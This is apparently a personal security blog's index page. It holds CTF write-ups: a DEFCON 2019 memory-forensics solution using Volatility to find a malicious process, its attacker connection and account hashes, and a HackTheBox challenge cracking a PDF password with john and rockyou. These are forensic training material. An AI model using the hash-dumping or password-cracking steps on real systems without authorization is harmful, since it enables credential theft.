@@ -1,0 +1,907 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta name="viewport"content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=yes"/>
+  
+  
+  <title>  Ikonw </title>
+
+ 
+  
+    <link rel="icon" href="/images/favicon.png">
+  
+
+
+  
+<link rel="stylesheet" href="/nayo.min.css">
+ 
+<meta name="generator" content="Hexo 7.0.0"><link rel="alternate" href="/atom.xml" title="Ikonw" type="application/atom+xml">
+</head>  
+  <body>   
+    
+      <header class="header-wrapper">
+  <nav class="inner">
+    <div class="title">
+      <a href="/">
+        <img class="logo" src="/images/logo.png" />
+      </a>
+    </div>
+
+    <ul class="menu">
+      <li class="item">
+        <a class="link" id="menu-home" href="/"> <!-- Home -->
+          <i class="iconfont icon-home"></i>
+        </a>
+      </li>
+      <li class="item">
+        <a class="link" id="menu-archives" href="/archives"> <!-- Archives -->
+          <i class="iconfont icon-archives"></i>
+        </a>
+      </li>
+      <li class="item">
+        <a class="link" id="menu-tags" href="/tags"> <!-- Tags -->
+          <i class="iconfont icon-tags"></i>
+        </a>
+      </li>
+      <li class="item">
+        <a class="link" id="menu-about" href="/about"> <!-- About -->
+          <i class="iconfont icon-about"></i>
+        </a>
+      </li>
+      <li class="item">
+        <a class="link" id="menu-search"> <!-- Search -->
+          <i class="iconfont icon-search"></i>
+        </a>
+      </li>
+    </ul>
+  </nav>
+</header>
+
+
+<header class="mobile-header-wrapper">
+  <i id="mobile-toggle" class="iconfont icon-menu mobile-toggle"></i>
+</header>   
+
+      <div class="container">       
+          
+          
+            <div class="container-inner">  
+          
+
+          
+
+
+<div class="index slideDownMin">
+	
+
+	<div class="profile">
+
+		<img class="avatar" src="/images/avatar.jpg">
+
+		<p class="author">Ikonw</p>
+
+<div class="social">
+
+<a class="iconfont icon-Github" target="_blank" href="https://github.com/Ik0nw" title="Github">
+</a>
+
+<a class="iconfont icon-Telegram" target="_blank" href="https://t.me/ikonwwww" title="Telegram">
+</a>
+
+</div>
+	</div>
+
+
+	
+
+	
+	
+	
+
+<article class="article">		
+	   
+	<div class="article-header">
+	    
+		<a  class="title" href="/2020/08/22/Defcon-DFIR-memory_forensic/">Defcon DFIR memory forensic CTF 2019</a>  
+	       
+		 
+
+		<div class='meta'>
+			<time>Aug 22, 2020</time>			
+		</div>
+	</div>
+
+
+	
+
+    
+	<div class="typo article-excerpt">	
+		 
+			<h3 id="Memory-Image-https-www-dropbox-com-sh-4qfk1miauqbvqst-AAAVCI1G8Sc8xMoqK-TtmSbia-dl-0"><a href="#Memory-Image-https-www-dropbox-com-sh-4qfk1miauqbvqst-AAAVCI1G8Sc8xMoqK-TtmSbia-dl-0" class="headerlink" title="Memory Image: https://www.dropbox.com/sh/4qfk1miauqbvqst/AAAVCI1G8Sc8xMoqK_TtmSbia?dl=0"></a>Memory Image: <a target="_blank" rel="noopener" href="https://www.dropbox.com/sh/4qfk1miauqbvqst/AAAVCI1G8Sc8xMoqK_TtmSbia?dl=0">https://www.dropbox.com/sh/4qfk1miauqbvqst/AAAVCI1G8Sc8xMoqK_TtmSbia?dl=0</a></h3><h2 id="Question-1"><a href="#Question-1" class="headerlink" title="Question 1:"></a>Question 1:</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">What is the SHA1 <span class="built_in">hash</span> of triage.mem?</span><br><span class="line"></span><br><span class="line">Flag Format-flag&lt;xyz&gt;</span><br><span class="line">Everything after the – is what you need to submit, your answer is the xyx.</span><br></pre></td></tr></table></figure>
+
+<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution:"></a>Solution:</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kali Desktop/forensic_images » <span class="built_in">sha1sum</span> memory.mem </span><br><span class="line">c95e8cc8c946f95a109ea8e47a6800de10a27abd  memory.mem</span><br></pre></td></tr></table></figure>
+
+<h2 id="Question-2"><a href="#Question-2" class="headerlink" title="Question 2:"></a>Question 2:</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">What profile is the most appropriate <span class="keyword">for</span> this machine? (ex: Win10x86_14393)</span><br><span class="line"></span><br><span class="line">Flag Format-flag&lt;xyz&gt;</span><br><span class="line">Everything after the – is what you need to submit, your answer is the xyx.</span><br></pre></td></tr></table></figure>
+
+<p>The first step of volatility is always find the image info of the memory dump.</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kali Desktop/forensic_images » volatility imageinfo -f memory.mem </span><br><span class="line">Volatility Foundation Volatility Framework 2.6</span><br><span class="line">INFO    : volatility.debug    : Determining profile based on KDBG search...</span><br><span class="line">          Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_24000, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_24000, Win7SP1x64_23418</span><br><span class="line">                     AS Layer1 : WindowsAMD64PagedMemory (Kernel AS)</span><br><span class="line">                     AS Layer2 : FileAddressSpace (/root/Desktop/forensic_images/memory.mem)</span><br><span class="line">                      PAE <span class="built_in">type</span> : No PAE</span><br><span class="line">                           DTB : 0x187000L</span><br><span class="line">                          KDBG : 0xf800029f80a0L</span><br><span class="line">          Number of Processors : 2</span><br><span class="line">     Image Type (Service Pack) : 1</span><br><span class="line">                KPCR <span class="keyword">for</span> CPU 0 : 0xfffff800029f9d00L</span><br><span class="line">                KPCR <span class="keyword">for</span> CPU 1 : 0xfffff880009ee000L</span><br><span class="line">             KUSER_SHARED_DATA : 0xfffff78000000000L</span><br><span class="line">           Image <span class="built_in">date</span> and time : 2019-03-22 05:46:00 UTC+0000</span><br><span class="line">     Image <span class="built_in">local</span> <span class="built_in">date</span> and time : 2019-03-22 01:46:00 -0400</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>Got the answer as <em>Win7SP1x64</em></p>
+<h2 id="Question-3"><a href="#Question-3" class="headerlink" title="Question 3:"></a>Question 3:</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">What was the process ID of notepad.exe?</span><br><span class="line"></span><br><span class="line">Flag Format-flag&lt;xyz&gt;</span><br><span class="line">Everything after the – is what you need to submit, your answer is the xyx.</span><br></pre></td></tr></table></figure>
+
+<h2 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution:"></a>Solution:</h2><p>We indicated the profile and use the <em>pslist</em> plugin to print all the running process</p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">kali</span> Desktop/forensic_images » volatility -f memory.mem --profile=Win7SP1x64 pslist | grep notepad</span><br><span class="line"><span class="attribute">Volatility</span> Foundation Volatility Framework <span class="number">2</span>.<span class="number">6</span></span><br><span class="line"><span class="attribute">0xfffffa80054f9060</span> notepad.exe            <span class="number">3032</span>   <span class="number">1432</span>      <span class="number">1</span>       <span class="number">60</span>      <span class="number">1</span>      <span class="number">0</span> <span class="number">2019</span>-<span class="number">03</span>-<span class="number">22</span> <span class="number">05</span>:<span class="number">32</span>:<span class="number">22</span> UTC+<span class="number">0000</span></span><br></pre></td></tr></table></figure>
+
+<p>and we got the answer pid as  <em>3032</em></p>
+<h2 id="Question-4"><a href="#Question-4" class="headerlink" title="Question 4:"></a>Question 4:</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Name the child processes of wscript.exe.</span><br><span class="line"></span><br><span class="line">Flag Format-flag&lt;xyz&gt;</span><br><span class="line">Everything after the – is what you need to submit, your answer is the xyx.</span><br></pre></td></tr></table></figure>
+
+<h2 id="Solution-2"><a href="#Solution-2" class="headerlink" title="Solution:"></a>Solution:</h2><p>pstree will indicate child process using idention and periods.</p>
+<p>Let’s grep the top and bottom 3 line of process <em>wscript.exe</em></p>
+<figure class="highlight tap"><table><tr><td class="code"><pre><span class="line">kali Desktop/forensic_images » volatility -f memory.mem --profile=Win7SP1x64 pstree | grep -C<span class="number"> 3 </span>wscript.exe </span><br><span class="line">Volatility Foundation Volatility Framework 2.6</span><br><span class="line">. 0xfffffa8004798320:calc.exe                       <span class="number"> 3548 </span> <span class="number"> 1432 </span>    <span class="number"> 3 </span>   <span class="number"> 77 </span>2019-03-22 05:34:43 UTC+0000</span><br><span class="line">. 0xfffffa80053d3060:POWERPNT.EXE                   <span class="number"> 4048 </span> <span class="number"> 1432 </span>   <span class="number"> 23 </span>  <span class="number"> 765 </span>2019-03-22 05:35:09 UTC+0000</span><br><span class="line">. 0xfffffa8004905620:hfs.exe                        <span class="number"> 3952 </span> <span class="number"> 1432 </span>    <span class="number"> 6 </span>  <span class="number"> 214 </span>2019-03-22 05:34:51 UTC+0000</span><br><span class="line">.. 0xfffffa8005a80060:wscript.exe                   <span class="number"> 5116 </span> <span class="number"> 3952 </span>    <span class="number"> 8 </span>  <span class="number"> 312 </span>2019-03-22 05:35:32 UTC+0000</span><br><span class="line">... 0xfffffa8005a1d9e0:UWkpjFjDzM.exe               <span class="number"> 3496 </span> <span class="number"> 5116 </span>    <span class="number"> 5 </span>  <span class="number"> 109 </span>2019-03-22 05:35:33 UTC+0000</span><br><span class="line">.... 0xfffffa8005bb0060:cmd.exe                     <span class="number"> 4660 </span> <span class="number"> 3496 </span>    <span class="number"> 1 </span>   <span class="number"> 33 </span>2019-03-22 05:35:36 UTC+0000</span><br><span class="line">. 0xfffffa80054f9060:notepad.exe                    <span class="number"> 3032 </span> <span class="number"> 1432 </span>    <span class="number"> 1 </span>   <span class="number"> 60 </span>2019-03-22 05:32:22 UTC+000</span><br></pre></td></tr></table></figure>
+
+<p>and we got the answer <em>UWkpjFjDzM.exe</em></p>
+<h2 id="Question-5"><a href="#Question-5" class="headerlink" title="Question 5:"></a>Question 5:</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">What was the IP address of the machine at the time the RAM dump was created?</span><br><span class="line"></span><br><span class="line">Flag Format-flag&lt;xyz&gt;</span><br><span class="line">Everything after the – is what you need to submit, your answer is the xyx.</span><br></pre></td></tr></table></figure>
+
+<h2 id="Solution-3"><a href="#Solution-3" class="headerlink" title="Solution:"></a>Solution:</h2><p>We have to find the ip address, using the plugin <em>netscan</em></p>
+<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">kali Desktop/forensic_images » volatility -f memory.mem <span class="attribute">--profile</span>=Win7SP1x64 netscan | grep -v <span class="string">&#x27;127.0.0.1\|0.0.0.0&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>Use grep to filter localhost ip address. The owner of system process <em>svchost.exe</em> seems bind to ip address 10.0.0.101:55736 which is the IP address when the RAM dump is created</p>
+<p><img src="/images/Defcon-DFIR-memory-forensic-CTF-2019/image-20200822132847349.png" alt="image-20200822132847349"></p>
+<h2 id="Question-6"><a href="#Question-6" class="headerlink" title="Question 6"></a>Question 6</h2><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">Based <span class="keyword">on</span> the answer regarding <span class="keyword">to</span> the infected PID, can you determine what the IP <span class="keyword">of</span> the attacker was?</span><br><span class="line"></span><br><span class="line">Flag <span class="keyword">Format</span>-flag&lt;xyz&gt;</span><br><span class="line">Everything <span class="keyword">after</span> the – <span class="keyword">is</span> what you need <span class="keyword">to</span> submit, your answer <span class="keyword">is</span> the xyx.</span><br></pre></td></tr></table></figure>
+
+<h2 id="Solution-4"><a href="#Solution-4" class="headerlink" title="Solution"></a>Solution</h2><p>Going back to question 4 we found out the malicious process is <em>UWkpjFjDzM.exe</em></p>
+<p>Still using the same <em>netscan</em> plugin,we find out there’s a connection to <em>10.0.0.106</em> port 4444 is one of the favorite port for malicious connection from hacker </p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">kali</span> Desktop/forensic_images » volatility -f memory.mem --profile=Win7SP1x64 netscan | grep UWkpjFjDzM.exe         </span><br><span class="line"><span class="attribute">Volatility</span> Foundation Volatility Framework <span class="number">2</span>.<span class="number">6</span></span><br><span class="line"><span class="attribute">0x13e397190</span>        TCPv4    <span class="number">10.0.0.101:49217</span>               <span class="number">10.0.0.106:4444</span>      ESTABLISHED      <span class="number">3496</span>     UWkpjFjDzM.exe</span><br></pre></td></tr></table></figure>
+
+<p>So the malicious hacker ip is <em>10.0.0.106</em></p>
+<h2 id="Question-7"><a href="#Question-7" class="headerlink" title="Question 7"></a>Question 7</h2><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">What process <span class="type">name</span> <span class="keyword">is</span> VCRUNTIME140.dll associated <span class="keyword">with</span>?</span><br><span class="line"></span><br><span class="line">Flag <span class="keyword">Format</span>-flag&lt;xyz&gt;</span><br><span class="line">Everything <span class="keyword">after</span> the – <span class="keyword">is</span> what you need <span class="keyword">to</span> submit, your answer <span class="keyword">is</span> the xyx.</span><br></pre></td></tr></table></figure>
+
+<h2 id="Solution-5"><a href="#Solution-5" class="headerlink" title="Solution"></a>Solution</h2><p>We have to use the <em>dlllist</em> plugin</p>
+<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">kali Desktop/forensic_images » volatility -f memory.mem <span class="attribute">--profile</span>=Win7SP1x64 dlllist &gt; dlllist</span><br></pre></td></tr></table></figure>
+
+<p>We find the keyword dll <em>VCRUNTIME140.dll</em></p>
+<p>we found the malicious software <em>OfficeClickToRun.exe</em></p>
+<p>However beware that the process name should be <em>OfficeClickToR</em></p>
+<p><img src="/images/Defcon-DFIR-memory-forensic-CTF-2019/image-20200822134112881.png" alt="image-20200822134112881"></p>
+<h2 id="Question-8"><a href="#Question-8" class="headerlink" title="Question 8"></a>Question 8</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">What is the md5 <span class="built_in">hash</span> value the potential malware on the system?</span><br><span class="line"></span><br><span class="line">Flag Format-flag&lt;xyz&gt;</span><br><span class="line">Everything after the – is what you need to submit, your answer is the xyx.</span><br></pre></td></tr></table></figure>
+
+<h2 id="Solution-6"><a href="#Solution-6" class="headerlink" title="Solution :"></a>Solution :</h2><p>We are not able to identify the hash directly in memory dump.</p>
+<p>We have to use one of the volatility function <em>Procdump</em></p>
+<p>At first I though the malicious process is <em>OfficeClickToR</em></p>
+<p>but it appears to be <em>UWkpjFjDzM.exe</em> we found earlier one</p>
+<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">kali Desktop/forensic_images » volatility -f memory<span class="selector-class">.mem</span> <span class="attr">--profile</span>=Win7SP1x64 procdump -<span class="selector-tag">p</span> <span class="number">3496</span> <span class="attr">--dump-dir</span> .</span><br><span class="line">Volatility Foundation Volatility Framework <span class="number">2.6</span></span><br><span class="line"><span class="function"><span class="title">Process</span><span class="params">(V)</span></span>         ImageBase          Name                 Result</span><br><span class="line">------------------ ------------------ -------------------- ------</span><br><span class="line"><span class="number">0</span>xfffffa8005a1d9e0 <span class="number">0</span>x0000000000400000 UWkpjFjDzM<span class="selector-class">.exe</span>       OK: executable.<span class="number">3496</span><span class="selector-class">.exe</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">kali Desktop/forensic_images » md5sum <span class="built_in">executable</span>.<span class="number">3496</span>.<span class="keyword">exe</span> </span><br><span class="line"><span class="number">690</span>ea20bc3bdfb328e23005d9a80c290  <span class="built_in">executable</span>.<span class="number">3496</span>.<span class="keyword">exe</span></span><br></pre></td></tr></table></figure>
+
+<p>and we got the md5 hash</p>
+<h2 id="Question-9"><a href="#Question-9" class="headerlink" title="Question 9"></a>Question 9</h2><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">What <span class="keyword">is</span> the LM hash <span class="keyword">of</span> bobs account?</span><br><span class="line"></span><br><span class="line">Flag <span class="keyword">Format</span>-flag&lt;xyz&gt;</span><br><span class="line">Everything <span class="keyword">after</span> the – <span class="keyword">is</span> what you need <span class="keyword">to</span> submit, your answer <span class="keyword">is</span> the xyx.</span><br></pre></td></tr></table></figure>
+
+<h2 id="Solution-7"><a href="#Solution-7" class="headerlink" title="Solution :"></a>Solution :</h2><p>Use the <em>hashdump</em> plugin</p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">kali</span> Desktop/forensic_images » volatility -f memory.mem --profile=Win7SP1x64 hashdump                     </span><br><span class="line"><span class="attribute">Volatility</span> Foundation Volatility Framework <span class="number">2</span>.<span class="number">6</span></span><br><span class="line"><span class="attribute">Administrator</span>:<span class="number">500</span>:aad3b435b51404eeaad3b435b51404ee:<span class="number">31</span>d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line"><span class="attribute">Guest</span>:<span class="number">501</span>:aad3b435b51404eeaad3b435b51404ee:<span class="number">31</span>d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line"><span class="attribute">Bob</span>:<span class="number">1000</span>:aad3b435b51404eeaad3b435b51404ee:<span class="number">31</span>d6cfe0d16ae931b73c59d7e0c089c0:::</span><br></pre></td></tr></table></figure>
+
+<p>and we got bob’s hash</p>
+<h2 id="Question-10"><a href="#Question-10" class="headerlink" title="Question 10"></a>Question 10</h2><figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">What protections <span class="keyword">does</span> <span class="keyword">the</span> VAD node <span class="keyword">at</span> <span class="number">0xfffffa800577ba10</span> have?</span><br><span class="line"></span><br><span class="line">Flag Format-flag&lt;xyz&gt;</span><br><span class="line">Everything <span class="keyword">after</span> <span class="keyword">the</span> – <span class="keyword">is</span> what you need <span class="keyword">to</span> submit, your answer <span class="keyword">is</span> <span class="keyword">the</span> xyx.</span><br></pre></td></tr></table></figure>
+
+<h2 id="Solution-8"><a href="#Solution-8" class="headerlink" title="Solution"></a>Solution</h2><p>simple</p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">kali</span> Desktop/forensic_images » volatility -f memory.mem --profile=Win7SP1x64 vadinfo | grep -A <span class="number">5</span> &#x27;<span class="number">0</span>xfffffa800577ba10&#x27;                                                                                                                <span class="number">130</span> ↵</span><br><span class="line"><span class="attribute">Volatility</span> Foundation Volatility Framework <span class="number">2</span>.<span class="number">6</span></span><br><span class="line"><span class="attribute">VAD</span> node @ <span class="number">0</span>xfffffa800577ba10 Start <span class="number">0</span>x0000000000030000 End <span class="number">0</span>x0000000000033fff Tag Vad </span><br><span class="line"><span class="attribute">Flags</span>: NoChange: <span class="number">1</span>, Protection: <span class="number">1</span></span><br><span class="line"><span class="attribute">Protection</span>: PAGE_READONLY</span><br><span class="line"><span class="attribute">Vad</span> Type: VadNone</span><br><span class="line"><span class="attribute">ControlArea</span> @fffffa8005687a50 Segment fffff8a000c4f870</span><br><span class="line"><span class="attribute">NumberOfSectionReferences</span>:          <span class="number">1</span> NumberOfPfnReferences:           <span class="number">0</span></span><br></pre></td></tr></table></figure>
+
+<p>The answer is <em>PAGE_READONLY</em></p>
+<h2 id="Question-11"><a href="#Question-11" class="headerlink" title="Question 11"></a>Question 11</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">There was a VBS script run on the machine. What is the name of the script? (submit without file extension)</span><br><span class="line"></span><br><span class="line">Flag Format-flag&lt;xyz&gt;</span><br><span class="line">Everything after the – is what you need to submit, your answer is the xyx.</span><br></pre></td></tr></table></figure>
+
+<h2 id="Solution-9"><a href="#Solution-9" class="headerlink" title="Solution:"></a>Solution:</h2><p>After some research find out that, wscript.exe is tasked with executing the VBScript files.</p>
+<p>[What is wscript.exe?]([<a target="_blank" rel="noopener" href="https://www.file.net/process/wscript.exe.html#:~:text=The%20genuine%20wscript.exe%20file,any%20harm%20to%20your%20PC.]">https://www.file.net/process/wscript.exe.html#:~:text=The%20genuine%20wscript.exe%20file,any%20harm%20to%20your%20PC.]</a>(<a target="_blank" rel="noopener" href="https://www.file.net/process/wscript.exe.html#:~:text=The">https://www.file.net/process/wscript.exe.html#:~:text=The</a> genuine wscript.exe file,any harm to your PC.))</p>
+<p>Hence, we can perform a <em>memory dump</em> on <em>wscript.exe</em> and use strings to identify which VBScripts file has been executed</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kali Desktop/forensic_images » volatility -f memory.mem --profile=Win7SP1x64 memdump -p 5116 --dump-dir .                                                                                                                              2 ↵</span><br><span class="line">Volatility Foundation Volatility Framework 2.6</span><br><span class="line">************************************************************************</span><br><span class="line">Writing wscript.exe [  5116] to 5116.dmp</span><br><span class="line">kali Desktop/forensic_images » strings 5116.dmp| grep vbs                                   </span><br><span class="line"><span class="string">&quot;C:\Windows\System32\wscript.exe&quot;</span> //B //NOLOGO %TEMP%\vhjReUDEuumrX.vbs</span><br><span class="line">%TEMP%\vhjReUDEuumrX.vbs</span><br><span class="line">%TEMP%\vhjReUDEuumrX.vbs</span><br><span class="line">vbscript.dll</span><br><span class="line">vbscript.pdb</span><br><span class="line">vbscript</span><br><span class="line">.vbs</span><br><span class="line">.vbs</span><br><span class="line">x86_microsoft-windows-m..ents-mdac-ado15-vbs_31bf3856ad364e35_none_9360988f60461a77</span><br><span class="line">amd64_microsoft-windows-m..ents-mdac-oledb-vbs_31bf3856ad364e35_none_444030db0904e80b</span><br><span class="line">amd64_microsoft-windows-m..nts-mdac-rds-ce-vbs_31bf3856ad364e35_none_17691405728212bf</span><br><span class="line">amd64_microsoft-windows-scripting-vbscript_31bf3856ad364e35_none_1dd485790300b91fn</span><br><span class="line">x86_microsoft-windows-m..ents-mdac-oledb-vbs_31bf3856ad364e35_none_e821955750a776d5</span><br><span class="line">x86_microsoft-windows-m..nts-mdac-rds-ce-vbs_31bf3856ad364e35_none_bb4a7881ba24a189</span><br><span class="line">wow64_microsoft-windows-scripting-vbscript_31bf3856ad364e35_none_28292fcb37617b1a</span><br><span class="line">amd64_microsoft-windows-m..ents-mdac-ado15-vbs_31bf3856ad364e35_none_ef7f341318a38bad</span><br><span class="line">vbscript</span><br><span class="line">.vbs</span><br><span class="line">.vbs</span><br><span class="line">x86_microsoft-windows-s..-vbscript.resources_31bf3856ad364e35_en-us_fc14ed9ab50fcbf0</span><br><span class="line">amd64_microsoft-windows-s..-vbscript.resources_31bf3856ad364e35_en-us_5833891e6d6d3d26</span><br><span class="line">version:1|.ade:3|.adp:3|.app:3|.asp:3|.bas:3|.bat:3|.bz:3|.bz2:3|.cer:3|.chm:3|.class:3|.cmd:3|.com:3|.<span class="built_in">command</span>:3|.cpl:3|.crt:3|.csh:3|.desktop:3|.exe:3|.fxp:3|.gz:3|.hex:3|.hlp:3|.hqx:3|.hta:3|.inf:3|.ini:3|.ins:3|.isp:3|.its:3|.job:3|.js:3|.jse:3|.ksh:3|.lnk:3|.lzh:3|.mad:3|.maf:3|.mag:3|.mam:3|.maq:3|.mar:3|.mas:3|.mat:3|.mau:3|.mav:3|.maw:3|.mda:3|.mde:3|.mdt:3|.mdw:3|.mdz:3|.msc:3|.msi:3|.msp:3|.mst:3|.ocx:3|.ops:3|.pcd:3|.pi:3|.pif:3|.prf:3|.prg:3|.pst:3|.rar:3|.reg:3|.scf:3|.scr:3|.sct:3|.sea:3|.shb:3|.shs:3|.sit:3|.tar:3|.tgz:3|.tmp:3|.url:3|.vb:3|.vbe:3|.vbs:3|.vsmacros:3|.vss:3|.vst:3|.vsw:3|.webloc:3|.ws:3|.wsc:3|.wsf:3|.wsh:3|.zip:3|.zlo:3|.zoo:3|.pdf:2|.fdf:2</span><br><span class="line">version:1|shell:3|hcp:3|ms-help:3|ms-its:3|ms-itss:3|its:3|mk:3|mhtml:3|<span class="built_in">help</span>:3|disk:3|afp:3|disks:3|telnet:3|ssh:3|javascript:1|vbscript:1|acrobat:2|mailto:2|file:2</span><br><span class="line">eventvwr.exegatherNetworkInfo.vbs</span><br><span class="line">slmgr.vbs</span><br><span class="line">winrm.vbs</span><br><span class="line">amd64_microsoft-windows-m..ents-mdac-oledb-vbs_31bf3856ad364e35_none_444030db0904e80b</span><br><span class="line">.vbs</span><br><span class="line">amd64_microsoft-windows-s..-vbscript.resources_31bf3856ad364e35_en-us_5833891e6d6d3d26</span><br><span class="line">x86_microsoft-windows-s..-vbscript.resources_31bf3856ad364e35_en-us_fc14ed9ab50fcbf0</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>The answer is <em>vhjReUDEuumrX.vbs</em></p>
+<h2 id="Question-12"><a href="#Question-12" class="headerlink" title="Question 12"></a>Question 12</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">An application was run at 2019-03-07 23:06:58 UTC, what is the name of the program? (Include extension)</span><br><span class="line"></span><br><span class="line">Flag Format-flag&lt;xyz&gt;</span><br><span class="line">Everything after the – is what you need to submit, your answer is the xyx.</span><br></pre></td></tr></table></figure>
+
+<h2 id="Solution-10"><a href="#Solution-10" class="headerlink" title="Solution"></a>Solution</h2><p>I have no clue at first, but manage to find the plugin <em>shimache</em> which indicates the timestamp</p>
+<p><a target="_blank" rel="noopener" href="https://www.fireeye.com/blog/threat-research/2015/06/caching_out_the_val.html">Caching Out: The Value of Shimcache for Investigators</a></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kali Desktop/forensic_images » volatility -f memory.mem --profile=Win7SP1x64 shimcache | grep <span class="string">&#x27;2019-03-07 23:06:58&#x27;</span></span><br><span class="line">Volatility Foundation Volatility Framework 2.6</span><br><span class="line">2019-03-07 23:06:58 UTC+0000   \??\C:\Program Files (x86)\Microsoft\Skype <span class="keyword">for</span> Desktop\Skype.exe</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>We find out The <em>skype</em> application is running</p>
+<h2 id="Question-13"><a href="#Question-13" class="headerlink" title="Question 13"></a>Question 13</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">What was written <span class="keyword">in</span> notepad.exe <span class="keyword">in</span> the time of the memory dump?</span><br><span class="line"></span><br><span class="line">Flag Format-flag&lt;xyz&gt;</span><br><span class="line">Everything after the – is what you need to submit, your answer is the xyx.</span><br></pre></td></tr></table></figure>
+
+<h2 id="Solution-11"><a href="#Solution-11" class="headerlink" title="Solution"></a>Solution</h2><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">kali Desktop/forensic_images » volatility -<span class="keyword">f</span> memory.mem --<span class="keyword">profile</span>=Win7SP1x64 memdump -<span class="keyword">p</span> <span class="number">3032</span> --dump-dir .</span><br><span class="line">kali Desktop/forensic_images » strings -<span class="keyword">e</span> <span class="keyword">l</span> <span class="number">3032</span>.dmp | <span class="keyword">grep</span> <span class="string">&quot;flag&lt;&quot;</span></span><br><span class="line">flag<span class="symbol">&lt;REDBULL_IS_LIFE&gt;</span></span><br><span class="line">flag<span class="symbol">&lt;Th&gt;</span></span><br><span class="line">flag<span class="symbol">&lt;Th&gt;</span></span><br><span class="line">flag<span class="symbol">&lt;TheK&gt;</span></span><br><span class="line">flag<span class="symbol">&lt;TheK&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>The solution is straight forward, get the notepad memory dump and grep for the flag</p>
+<h2 id="Question-14"><a href="#Question-14" class="headerlink" title="Question 14"></a>Question 14</h2><figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">What <span class="keyword">is</span> <span class="keyword">the</span> shortname <span class="keyword">of</span> <span class="keyword">the</span> <span class="built_in">file</span> <span class="keyword">at</span> <span class="built_in">file</span> <span class="built_in">record</span> <span class="number">59045</span>?</span><br><span class="line"></span><br><span class="line">Flag Format-flag&lt;xyz&gt;</span><br><span class="line">Everything <span class="keyword">after</span> <span class="keyword">the</span> – <span class="keyword">is</span> what you need <span class="keyword">to</span> submit, your answer <span class="keyword">is</span> <span class="keyword">the</span> xyx.</span><br></pre></td></tr></table></figure>
+
+
+		  	  
+	</div>
+
+
+
+	<div class="article-categories">
+	 
+      <i class="iconfont icon-category" style="margin-right:4px"></i>
+	  	            
+				<a class="link" href="/categories/CTF/">CTF</a>           
+		
+      
+	</div>
+	
+
+	<div class="article-tags">
+		
+			<i class="iconfont icon-tags" style="margin-right:4px"></i>
+			            
+				<a class="link" href="/tags/forensic/">forensic</a>           
+			
+		
+	</div>
+
+	<div class='article-bottom'>
+		<a class="readmore" href="/2020/08/22/Defcon-DFIR-memory_forensic/">Continue</a> 	
+	</div>	
+    
+</article>
+
+	
+	
+	
+	
+
+<article class="article">		
+	   
+	<div class="article-header">
+	    
+		<a  class="title" href="/2020/08/15/Challenge-G0ld/">HTB::Challenge [Misc] G0ld</a>  
+	       
+		 
+
+		<div class='meta'>
+			<time>Aug 15, 2020</time>			
+		</div>
+	</div>
+
+
+	
+
+    
+	<div class="typo article-excerpt">	
+		 
+			<p><img src="/images/gold/image-20200815132255084.png" alt="image-20200815132255084"></p>
+<p>After extracted the file </p>
+<p><img src="/images/gold/image-20200815132422801.png" alt="image-20200815132422801"></p>
+<p>The pdf file is password protected.</p>
+<p>Search for pdf2john</p>
+<p><img src="/images/gold/image-20200815132545541.png" alt="image-20200815132545541"></p>
+<p>and we created the hash for john to cracked it.</p>
+<p>By using the rockyou dictionary, we are able to get the password </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">john --wordlist=&lt;rockyou.txt&gt; &lt;pdf_hash&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/gold/image-20200815132649389.png" alt="image-20200815132649389"></p>
+<p>we got the password <em>jumanji69</em></p>
+<p>after open the pdf, found morse code</p>
+<p><img src="/images/gold/image-20200815132749285.png" alt="image-20200815132749285"></p>
+<p>copy it and decode online </p>
+<p>we got the flag</p>
+<p><img src="/images/gold/image-20200815132829275.png" alt="image-20200815132829275"></p>
+
+		  	  
+	</div>
+
+
+
+	<div class="article-categories">
+	 
+      <i class="iconfont icon-category" style="margin-right:4px"></i>
+	  	            
+				<a class="link" href="/categories/hackthebox-challenge/">hackthebox-challenge</a>           
+		            
